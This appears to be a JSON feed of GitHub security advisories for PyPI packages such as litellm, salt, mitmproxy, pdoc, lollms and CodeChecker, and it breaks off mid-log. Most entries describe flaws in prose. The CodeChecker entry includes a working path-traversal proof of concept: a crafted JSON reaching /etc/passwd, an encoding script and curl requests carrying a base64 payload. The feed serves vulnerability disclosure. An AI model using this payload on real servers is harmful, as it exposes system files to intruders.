{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>berriai/litellm version 1.34.34 is vulnerable to improper access control in its team management functionality. This vulnerability allows attackers to perform unauthorized actions such as creating, updating, viewing, deleting, blocking, and unblocking any teams, as well as adding or deleting any member to or from any teams. The vulnerability stems from insufficient access control checks in various team management endpoints, enabling attackers to exploit these functionalities without proper authorization.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5710\">https://nvd.nist.gov/vuln/detail/CVE-2024-5710</a></li>\n<li><a href=\"https://huntr.com/bounties/70897f59-a966-4d93-b71e-745e3da91970\">https://huntr.com/bounties/70897f59-a966-4d93-b71e-745e3da91970</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qqcv-vg9f-5rr3\">https://github.com/advisories/GHSA-qqcv-vg9f-5rr3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qqcv-vg9f-5rr3",
            "title": "[litellm] litellm vulnerable to improper access control in team management",
            "date_modified": "2024-06-28T14:34:16.000Z",
            "date_published": "2024-06-27T21:32:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qqcv-vg9f-5rr3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A specially crafted url can be created which leads to a directory traversal in the salt file server.\nA malicious user can read an arbitrary file from a Salt master’s filesystem.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22232\">https://nvd.nist.gov/vuln/detail/CVE-2024-22232</a></li>\n<li><a href=\"https://saltproject.io/security-announcements/2024-01-31-advisory\">https://saltproject.io/security-announcements/2024-01-31-advisory</a></li>\n<li><a href=\"https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab\">https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qw3-2wv6-p64x\">https://github.com/advisories/GHSA-2qw3-2wv6-p64x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qw3-2wv6-p64x",
            "title": "[salt] Path traversal in saltstack",
            "date_modified": "2024-06-27T17:48:32.000Z",
            "date_published": "2024-06-27T09:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qw3-2wv6-p64x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A specially crafted url can be created which leads to a directory traversal in the salt file server.\nA malicious user can read an arbitrary file from a Salt master’s filesystem.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22232\">https://nvd.nist.gov/vuln/detail/CVE-2024-22232</a></li>\n<li><a href=\"https://saltproject.io/security-announcements/2024-01-31-advisory\">https://saltproject.io/security-announcements/2024-01-31-advisory</a></li>\n<li><a href=\"https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab\">https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qw3-2wv6-p64x\">https://github.com/advisories/GHSA-2qw3-2wv6-p64x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qw3-2wv6-p64x",
            "title": "[salt] Path traversal in saltstack",
            "date_modified": "2024-06-27T17:48:32.000Z",
            "date_published": "2024-06-27T09:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qw3-2wv6-p64x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Syndic cache directory creation is vulnerable to a directory traversal attack in salt project which can lead&nbsp;a malicious attacker to create an arbitrary directory on a Salt master.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22231\">https://nvd.nist.gov/vuln/detail/CVE-2024-22231</a></li>\n<li><a href=\"https://saltproject.io/security-announcements/2024-01-31-advisory\">https://saltproject.io/security-announcements/2024-01-31-advisory</a></li>\n<li><a href=\"https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab\">https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q27c-j6j9-53w3\">https://github.com/advisories/GHSA-q27c-j6j9-53w3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q27c-j6j9-53w3",
            "title": "[salt] Directory creation by malicious user in saltstack",
            "date_modified": "2024-06-27T17:47:31.000Z",
            "date_published": "2024-06-27T09:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q27c-j6j9-53w3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Syndic cache directory creation is vulnerable to a directory traversal attack in salt project which can lead&nbsp;a malicious attacker to create an arbitrary directory on a Salt master.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22231\">https://nvd.nist.gov/vuln/detail/CVE-2024-22231</a></li>\n<li><a href=\"https://saltproject.io/security-announcements/2024-01-31-advisory\">https://saltproject.io/security-announcements/2024-01-31-advisory</a></li>\n<li><a href=\"https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab\">https://github.com/saltstack/salt/commit/e0cdb80b55123f4a024759ffcf2b3f0e0788e7ab</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q27c-j6j9-53w3\">https://github.com/advisories/GHSA-q27c-j6j9-53w3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q27c-j6j9-53w3",
            "title": "[salt] Directory creation by malicious user in saltstack",
            "date_modified": "2024-06-27T17:47:31.000Z",
            "date_published": "2024-06-27T09:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q27c-j6j9-53w3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package djangorestframework before 3.15.2 are vulnerable to Cross-site Scripting (XSS) via the break_long_headers template filter due to improper input sanitization before splitting and joining with <br> tags.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21520\">https://nvd.nist.gov/vuln/detail/CVE-2024-21520</a></li>\n<li><a href=\"https://github.com/encode/django-rest-framework/pull/9435\">https://github.com/encode/django-rest-framework/pull/9435</a></li>\n<li><a href=\"https://github.com/encode/django-rest-framework/commit/3b41f0124194430da957b119712978fa2266b642\">https://github.com/encode/django-rest-framework/commit/3b41f0124194430da957b119712978fa2266b642</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DJANGORESTFRAMEWORK-7252137\">https://security.snyk.io/vuln/SNYK-PYTHON-DJANGORESTFRAMEWORK-7252137</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gw84-84pc-xp82\">https://github.com/advisories/GHSA-gw84-84pc-xp82</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gw84-84pc-xp82",
            "title": "[djangorestframework] Cross-site Scripting in djangorestframework",
            "date_modified": "2024-06-26T17:48:09.000Z",
            "date_published": "2024-06-26T06:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gw84-84pc-xp82"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In mitmproxy 7.0.2 and below, a malicious client or server is able to perform <a href=\"https://en.wikipedia.org/wiki/HTTP_request_smuggling\">HTTP request smuggling</a> attacks through mitmproxy. This means that a malicious client/server could smuggle a request/response through mitmproxy as part of another request/response's HTTP message body. While mitmproxy would only see one request, the target server would see multiple requests. A smuggled request is still captured as part of another request's body, but it does not appear in the request list and does not go through the usual mitmproxy event hooks, where users may have implemented custom access control checks or input sanitization.</p>\n<p>Unless you use mitmproxy to protect an HTTP/1 service, no action is required.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been fixed in mitmproxy 7.0.3 and above.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>We thank João Sobral (@chinchila) for responsibly disclosing this vulnerability to the mitmproxy team.</p>\n<h3 id=\"timeline\">Timeline</h3>\n<ul>\n<li><strong>2021-09-08</strong>: Received initial report for mitmproxy &lt;= 6.0.2.</li>\n<li><strong>2021-09-08</strong>: Requested clarification if 7.x is affected.</li>\n<li><strong>2021-09-10</strong>: Received additional details, 7.x situation still unclear.</li>\n<li><strong>2021-09-13</strong>: Internally determined that 7.x is also affected.</li>\n<li><strong>2021-09-13</strong>: Shared initial fix with researcher.</li>\n<li><strong>2021-09-14</strong>: Received confirmation that fix is working, but H2.TE/H2.CL should also be looked at.</li>\n<li><strong>2021-09-14</strong>: Shared revised fix that includes additional H2.TE mitigations.</li>\n<li><strong>2021-09-14</strong>: Received confirmation that revised fix is working.</li>\n<li><strong>2021-09-16</strong>: Completed internal patch review.</li>\n<li><strong>2021-09-16</strong>: Published patch release and advisory.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-22gh-3r9q-xf38\">https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-22gh-3r9q-xf38</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-39214\">https://nvd.nist.gov/vuln/detail/CVE-2021-39214</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22gh-3r9q-xf38\">https://github.com/advisories/GHSA-22gh-3r9q-xf38</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22gh-3r9q-xf38",
            "title": "[mitmproxy] Lacking Protection against HTTP Request Smuggling in mitmproxy",
            "date_modified": "2024-06-26T15:20:27.000Z",
            "date_published": "2021-09-20T19:53:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22gh-3r9q-xf38"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Documentation generated with <code>pdoc --math</code> linked to JavaScript files from polyfill.io.\nThe polyfill.io CDN has been sold and now serves malicious code.</p>\n<p>Users who produce documentation with math mode should update immediately. All other users are unaffected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue has been fixed in pdoc 14.5.1.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/mitmproxy/pdoc/pull/703\">https://github.com/mitmproxy/pdoc/pull/703</a>\n<a href=\"https://sansec.io/research/polyfill-supply-chain-attack\">https://sansec.io/research/polyfill-supply-chain-attack</a></p>\n<h3 id=\"timeline\">Timeline</h3>\n<ul>\n<li><strong>[2024-06-25]</strong> <a href=\"https://sansec.io/research/polyfill-supply-chain-attack\">https://sansec.io/research/polyfill-supply-chain-attack</a> is published.</li>\n<li><strong>[2024-06-25 20:54 UTC]</strong> Issue reported to the pdoc project by @adhintz.</li>\n<li><strong>[2024-06-25 21:33 UTC]</strong> Patched version released.</li>\n<li><strong>[2024-06-25 21:37 UTC]</strong> Security advisory published.</li>\n<li><strong>[2024-06-25 23:49 UTC]</strong> CVE-2024-38526 assigned by GitHub.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mitmproxy/pdoc/security/advisories/GHSA-5vgj-ggm4-fg62\">https://github.com/mitmproxy/pdoc/security/advisories/GHSA-5vgj-ggm4-fg62</a></li>\n<li><a href=\"https://github.com/mitmproxy/pdoc/pull/703\">https://github.com/mitmproxy/pdoc/pull/703</a></li>\n<li><a href=\"https://sansec.io/research/polyfill-supply-chain-attack\">https://sansec.io/research/polyfill-supply-chain-attack</a></li>\n<li><a href=\"https://github.com/mitmproxy/pdoc/commit/726b8f2e365fe8afeb3604a7c73d19b460395d58\">https://github.com/mitmproxy/pdoc/commit/726b8f2e365fe8afeb3604a7c73d19b460395d58</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38526\">https://nvd.nist.gov/vuln/detail/CVE-2024-38526</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5vgj-ggm4-fg62\">https://github.com/advisories/GHSA-5vgj-ggm4-fg62</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5vgj-ggm4-fg62",
            "title": "[pdoc] pdoc embeds link to malicious CDN if math mode is enabled",
            "date_modified": "2024-06-26T15:06:22.000Z",
            "date_published": "2024-06-25T22:23:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5vgj-ggm4-fg62"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A denial of service (DoS) vulnerability exists in zenml-io/zenml version 0.56.3 due to improper handling of line feed (<code>\\n</code>) characters in component names. When a low-privileged user adds a component through the API endpoint <code>api/v1/workspaces/default/components</code> with a name containing a <code>\\n</code> character, it leads to uncontrolled resource consumption. This vulnerability results in the inability of users to add new components in certain categories (e.g., 'Image Builder') and to register new stacks through the UI, thereby degrading the user experience and potentially rendering the ZenML Dashboard unusable. The issue does not affect component addition through the Web UI, as <code>\\n</code> characters are properly escaped in that context. The vulnerability was tested on ZenML running in Docker, and it was observed in both Firefox and Chrome browsers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4460\">https://nvd.nist.gov/vuln/detail/CVE-2024-4460</a></li>\n<li><a href=\"https://github.com/zenml-io/zenml/commit/164cc09032060bbfc17e9dbd62c13efd5ff5771b\">https://github.com/zenml-io/zenml/commit/164cc09032060bbfc17e9dbd62c13efd5ff5771b</a></li>\n<li><a href=\"https://huntr.com/bounties/a387c935-b970-44d7-bddc-71c1c90aa2de\">https://huntr.com/bounties/a387c935-b970-44d7-bddc-71c1c90aa2de</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7gjr-hcc3-xfr4\">https://github.com/advisories/GHSA-7gjr-hcc3-xfr4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7gjr-hcc3-xfr4",
            "title": "[zenml] Improper line feed handling in zenml",
            "date_modified": "2024-06-24T21:28:27.000Z",
            "date_published": "2024-06-24T09:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7gjr-hcc3-xfr4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A remote code execution vulnerability exists in the create_conda_env function of the parisneo/lollms repository. The vulnerability arises from the use of shell=True in the subprocess.Popen function, which allows an attacker to inject arbitrary commands by manipulating the env_name and python_version parameters. This issue could lead to a serious security breach as demonstrated by the ability to execute the 'whoami' command among potentially other harmful commands.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3121\">https://nvd.nist.gov/vuln/detail/CVE-2024-3121</a></li>\n<li><a href=\"https://huntr.com/bounties/db57c343-9b80-4c1c-9ab0-9eef92c9b27b\">https://huntr.com/bounties/db57c343-9b80-4c1c-9ab0-9eef92c9b27b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-79h8-gxhq-q3jg\">https://github.com/advisories/GHSA-79h8-gxhq-q3jg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-79h8-gxhq-q3jg",
            "title": "[lollms] Remote Code Execution in create_conda_env function in lollms",
            "date_modified": "2024-06-24T21:25:40.000Z",
            "date_published": "2024-06-24T00:34:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-79h8-gxhq-q3jg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>CVE-2024-4320 describes a vulnerability in the parisneo/lollms software, specifically within the <code>ExtensionBuilder().build_extension()</code> function. The vulnerability arises from the <code>/mount_extension</code> endpoint, where a path traversal issue allows attackers to navigate beyond the intended directory structure. This is facilitated by the <code>data.category</code> and <code>data.folder</code> parameters accepting empty strings (<code>\"\"</code>), which, due to inadequate input sanitization, can lead to the construction of a <code>package_path</code> that points to the root directory. Consequently, if an attacker can create a <code>config.yaml</code> file in a controllable path, this path can be appended to the <code>extensions</code> list and trigger the execution of <code>__init__.py</code> in the current directory, leading to remote code execution. The vulnerability affects versions from 5.9.0, and has been addressed in version 9.5.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5443\">https://nvd.nist.gov/vuln/detail/CVE-2024-5443</a></li>\n<li><a href=\"https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f\">https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f</a></li>\n<li><a href=\"https://huntr.com/bounties/db52848a-4dbe-4110-a981-03739834bf45\">https://huntr.com/bounties/db52848a-4dbe-4110-a981-03739834bf45</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mvrm-fh8q-6wr2\">https://github.com/advisories/GHSA-mvrm-fh8q-6wr2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mvrm-fh8q-6wr2",
            "title": "[lollms] Remote Code Execution via path traversal bypass in lollms",
            "date_modified": "2024-06-24T21:22:51.000Z",
            "date_published": "2024-06-22T18:30:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mvrm-fh8q-6wr2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An open redirect vulnerability exists in the gradio-app/gradio, affecting the latest version. The vulnerability allows an attacker to redirect users to arbitrary websites, which can be exploited for phishing attacks, Cross-site Scripting (XSS), Server-Side Request Forgery (SSRF), amongst others. This issue is due to improper validation of user-supplied input in the handling of URLs. Attackers can exploit this vulnerability by crafting a malicious URL that, when processed by the application, redirects the user to an attacker-controlled web page.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4940\">https://nvd.nist.gov/vuln/detail/CVE-2024-4940</a></li>\n<li><a href=\"https://huntr.com/bounties/35aaea93-6895-4f03-9c1b-cd992665aa60\">https://huntr.com/bounties/35aaea93-6895-4f03-9c1b-cd992665aa60</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g6c9-f4xm-9j4x\">https://github.com/advisories/GHSA-g6c9-f4xm-9j4x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g6c9-f4xm-9j4x",
            "title": "[gradio] Open redirect in gradio",
            "date_modified": "2024-06-24T21:14:33.000Z",
            "date_published": "2024-06-22T06:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g6c9-f4xm-9j4x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>ZIP files uploaded to the server-side endpoint handling a <code>CodeChecker store</code> are not properly sanitized. An attacker can exercise a path traversal to make the <code>CodeChecker server</code> load and display files from an arbitrary location on the server machine.</p>\n<h2 id=\"details\">Details</h2>\n<h3>Target</h3>\n<p>The vulnerable endpoint is <code>/&lt;PRODUCT_URL&gt;/v6.53/CodeCheckerService@massStoreRun</code>.</p>\n<h3 id=\"exploit-overview\">Exploit overview</h3>\n<p>The attack is made possible by improper sanitization at one point in the process.</p>\n<ol>\n<li>When the ZIP file is uploaded by <code>CodeChecker store</code>, it is first unzipped to a temporary directory (safely).</li>\n<li>When deciding which files to insert into CodeChecker's internal database, the decision is made based on the <code>content_hashes.json</code> in the ZIP. An attacker has control over the contents of this file.</li>\n<li>After reading that file, the paths specified in the JSON are normalized by this code:\n<a href=\"https://github.com/Ericsson/codechecker/blob/fa41e4e5d9566b5a4f5a80a27bddec73a5146f5a/web/server/codechecker_server/api/mass_store_run.py#L442-L444\">https://github.com/Ericsson/codechecker/blob/fa41e4e5d9566b5a4f5a80a27bddec73a5146f5a/web/server/codechecker_server/api/mass_store_run.py#L442-L444</a></li>\n<li>Providing sufficiently many <code>../../</code>s inside the <code>content_hashes.json</code>, an attacker can control the insertion of completely arbitrary files into CodeChecker's internal database.</li>\n<li>This is confirmed in the log output:</li>\n</ol>\n<pre><code>mass_store_run.py:444 __store_source_files() - Storing source file: /etc/passwd\n</code></pre>\n<ol start=\"6\">\n<li>Once the file is inserted into the internal database, it can be displayed trivially on the Web interface.\nAs CodeChecker doesn't distinguish between filenames after the ZIP is extraced, an attacker can define aliases in <code>content_hashes.json</code>.</li>\n</ol>\n<pre><code>mass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd\nmass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.\n</code></pre>\n<ol start=\"7\">\n<li>The file is displayed in the Web UI if and only if there is at least one <em>bug report</em> in it.\nThe bug reports are coming from the ZIP and the attacker can craft the required contents for this.\nIf done so, the logs confirm the requirement for presenting the results of the exploit will be triggered:</li>\n</ol>\n<pre><code>hash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2\n</code></pre>\n<ol start=\"8\">\n<li>The server emits the contents of the injected files from the server's database to all users:\n<img alt=\"CodeChecker's Web UI showing the snapshot of the /etc/passwd file that was injected to the database due to the path traversal attack.\" src=\"https://user-images.githubusercontent.com/16914176/278057281-2c6994ed-4c24-4026-a6b6-148ac43243ca.png\"></li>\n</ol>\n<blockquote>\n<p>[!NOTE]<br>The file is shown with the contents as it was on the system when the exploited <code>CodeChecker store</code> was exercised. This attack does not allow the server to return the \"live\" contents of a file on the server's storage — the attacker(s) must recurringly exercise the exploit to keep the injected files \"updated\" in the database.</p>\n</blockquote>\n<h2 id=\"poc\">PoC</h2>\n<p>The minimal example that can trigger the exploit can be downloaded: <a href=\"https://github.com/Ericsson/codechecker/files/14757143/PoC.zip\"><code>PoC.zip</code></a>.</p>\n<p>The key to the exploit is the <code>content_hashes.json</code> file. The additional files create a report in the loaded <code>/etc/passwd</code> file, so it is displayed in the web UI.</p>\n<details><summary><tt>/content_hashes.json</tt></summary>\n\n<pre><code class=\"language-json\">{\"/../../../../../../../../../../../../../../../etc/passwd\": \"malformed_hash\", \"/etc/passwd\": \"malformed_hash\"}\n</code></pre>\n</details>\n\n<h4 id=\"uploading-the-zip-to-the-server\">Uploading the ZIP to the server</h4>\n<p>The communication between the <code>CodeChecker store</code> and the server is done by transmitting the ZIP file in a Base64-encoded string.<br>Encoding the ZIP into the format of the API can be done with Python:</p>\n<pre><code class=\"language-py\">import base64\nimport zlib\n\nwith open(\"PoC.zip\", \"rb\") as f:\n    contents = f.read()\nencoded = base64.b64encode(zlib.compress(contents))\nprint(encoded)\n</code></pre>\n<p>The result of the compression and encoding can be sent to the running server over the API.\nWhen the API is called, the exploit is exercised.</p>\n<pre><code class=\"language-bash\">curl \"&lt;SERVER_URL&gt;/&lt;PRODUCT_URL&gt;/v6.53/CodeCheckerService\" \\\n    --data \\\n    '[1,\"massStoreRun\",1,0,{\"1\":{\"str\":\"poc\"},\"3\":{\"str\":\"6.22.1\"},\"4\":{\"str\":\"&lt;ENCODED_ZIP&gt;\"},\"5\":{\"tf\":0}}]'\n</code></pre>\n<details><summary>One-line PoC</summary>\n\n<pre><code class=\"language-bash\">curl \"http://localhost:8001/Default/v6.53/CodeCheckerService\" \\\n    --data \\\n    '[1,\"massStoreRun\",1,0,{\"1\":{\"str\":\"poc\"},\"3\":{\"str\":\"6.22.1\"},\"4\" {\"str\":\"eJzNVk9vIzUUT3cpS4MqIcEB2Msw6oGV2vmXzKRZZVPYdpGqLSXSdrXqVquRM+NJhk7GI9tpN5Qe0SJx4MARCfEB+AaIE2glrnAAwY0DXwAQ4gT2ZCbj+ZNI2ROTWLaff+/5+edn+/XuXn2uXuOfi48frP7zh49Ym5eXWXFQSGFI7SEgQ0iU9wkKL2RVUZb4Q+qoESDk3JVvSvIIBB7CI+jGJuVNSV4MuOwx/16J/fvQP35QE74XWMEwQpgSNUMhnEfdEFCg5WoeMFxLc7Vtz2u0XVNvt0yrrbcA8JqN2MyUjK+YGeutk78fXqnVeLGWMTOCFLiAgilf63WJffIZxMRHIVujsZmIKEIBYYKTaZ9/F1kzhoRgBDktDnKhM4TOKcTyZgEDHMoM2+F4xJCN4qiDRiMQcm5PHhXHMp9kSzEMRZfe3Aag3296Ld2Ebrule6bnsbXp/WZjGxrA0TRNt6DeNG+U3DhH+NQPB7brY+hQhCfcrFqCoTGNxtSOAB1WAzAk44DaBI2xA23PDyDnqEBMjCRgFAVQiQKf0NiWEEp5+GWJsxAEkw/Y8rnp0ig59aMIcs604hD1R5BQNvE8p/pw4HNGdau9bTTaTaOpaJap66axWYGG8c4IWNPSrEazWXA/6ybNR+v1yyxa77Fo/WtlfPuja7UaL+Yy0Sqy2Nl5PAqkJCxuybqiyRIMWfCxjb0l3z96Z2tb3unWO2/svbd7dNy7I8VaUu/+7YP9XUneUtW3I2ZMVfeO9qTewf69I4nZUNU7h7IkDymNbqrq+fm5AjhKYaHJgez4YhRBTCcHzNgWU1Bc6spsmqn1nDtM6voO7dbXOqdw0nV9MAgRob5DOioXMDnAGPDGWopcm2IdQOGAxWUKZGJCMVtZ9wANfEeCGCPcURNZpsaPnc0PYlnRQRgqe/6Z78KHEKOysguJg/2IH9Cydo+dAYliwBcIgrKyT8gYxvegnV7EyLMDP4S2H05Fj2nZbMNtsE3vW6ahGc0WBF5ba+ltYDbclq41oFGeKECMm7yLM+oSElCQDa51fDb1AOKuzoyl7QzMz2wVWqsC8+VUgQuWO2p+M/n9Ibg72/Oc6+keRCJ2gUNTPLvF3Bw8oQuesR3IkTeXvrwXVRQuIrGaxkV+V1I5n8wcnYkyu9YIGMCqhS+I00QZg3AASU5X2JFiL0/OHHpEgsrrnUfRQpLm0bSIqAJVy/ve/P/43lHFbcj1xOOVyWfSTDZzveq+TQJDeIeFYCnYSJOkmZnUgXg0fZ9nay3c5XOu44DFIQFihGYLi/UGMISYvQOu3Z8sZ3uXZWC70wysfIEmT1RZa5pWVTqUNrI6fu669d7dlSs7tXlJ+UaS2EpJXZGi15PBldqrtU++6LQOr/2ycvr0z095/evn13/cY/V0knmZdTrJS6x8KSQTouWfn7weW/qe/Pvtu6xO+6LlcjYuWn66TJoiTj0xvV2+mB9+I8eHpannZfAic+srz5rPi358Ix98zOdP69c2rpf8KOdmoh9fX33GTE104+LJ7xt8+rT+7qeUjtXnOWaV/fYZBZ+9yHv/Ac5gmHc=\"},\"5\":{\"tf\":0}}]' \n</code></pre>\n</details>\n\n<details><summary>Full server logs for the <tt>store</tt> processing</summary>\n\n<pre><code>[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - server.py:342 do_POST() - 127.0.0.1:33352 -- [Anonymous] POST /Default/v6.53/CodeCheckerService@massStoreRun\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:61 __enter__() - [poc] Unzip storage file...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:82 unzip() - Unzipping mass storage ZIP '/tmp/tmpenegwbxj.zip' to '/home/discookie/.codechecker/tmpx7hg1teb'...\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:64 __exit__() - [poc] Unzip storage file done... (duration: 0.0 sec)\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1298 store() - Using unzipped folder '/home/discookie/.codechecker/tmpx7hg1teb'\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:61 __enter__() - [poc] Store source files...\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1310 store() - [poc] Storing 2 source file(s).\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:444 __store_source_files() - Storing source file: /etc/passwd\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:463 __store_source_files() - 17 fileid found\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:64 __exit__() - [poc] Store source files done... (duration: 0.01 sec)\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1363 store() - Storing into run 'poc' locked at '2023-10-25 14:30:31.615536'.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:686 __add_or_update_run() - Adding run 'poc'...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:730 __add_or_update_run() - Adding run history.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:755 __add_or_update_run() - Adding run done.\n[DEBUG][2023-10-25 14:30:31] {server} 